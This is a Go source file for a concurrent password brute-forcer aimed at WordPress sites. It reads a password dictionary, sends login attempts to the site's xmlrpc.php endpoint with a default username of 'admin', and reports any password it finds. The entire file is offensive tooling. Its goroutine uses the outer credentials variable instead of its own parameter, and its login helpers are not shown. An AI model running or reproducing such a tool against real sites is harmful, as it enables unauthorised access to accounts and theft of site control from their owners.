package main

import (
	"errors"
	"flag"
	"fmt"
	"os"
)

type CommandLineArgs struct {
	Url        string
	Dict       string
	Username   string
	MaxWorkers int
}

func parseCommandlineArgs() (*CommandLineArgs, error) {
	url := flag.String("url", "", "URL to WordPress website to target (without trailing /)")
	pwdList := flag.String("dict", "./dict/dict.txt", "A text dictionary containing passwords to try")
	username := flag.String("user", "admin", "Username to brute-force")
	maxWorkers := flag.Int("routines", 10, "Maximum number of Goroutines to spawn")
	flag.Parse()

	if *url == "" {
		return nil, errors.New("website url missing")
	}

	args := &CommandLineArgs{
		Url:        *url,
		Dict:       *pwdList,
		Username:   *username,
		MaxWorkers: *maxWorkers,
	}

	return args, nil
}

func run() error {
	args, err := parseCommandlineArgs()
	if err != nil {
		return err
	}

	pwdChan, err := getPasswords(args.Dict)
	if err != nil {
		return fmt.Errorf("failed to read passwords file: %w", err)
	}

	url := fmt.Sprintf("%s/xmlrpc.php", args.Url)
	results := make(chan Result)

	executor := &Executor{
		Url:        url,
		MaxWorkers: args.MaxWorkers,
	}
	go executor.Run(args.Username, pwdChan, results)

	attempts := 1
	for {
		result := <-results
		fmt.Printf("[!] num password attempts: %d\r", attempts)
		attempts++

		if result.Success {
			fmt.Println()
			fmt.Printf("[!] password found: %s\n", result.Password)
			break
		}
	}

	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %s\n", err.Error())
		os.Exit(1)
	}
}

type Executor struct {
	Url        string
	MaxWorkers int
}

func (e *Executor) Run(
	username string,
	passwords <-chan string,
	results chan<- Result,
) {
	fmt.Printf("[!] initiating requests \n")
	sem := make(chan int, e.MaxWorkers)

	for password := range passwords {
		credentials := &Credentials{username, password}

		go func(creds *Credentials) {
			sem <- 1
			result, err := attemptLogin(e.Url, credentials)
			if err != nil {
				fmt.Printf("[!] failed to attempt login: %s\n", err.Error())
				return
			}

			results <- *result
			<-sem
		}(credentials)
	}
}
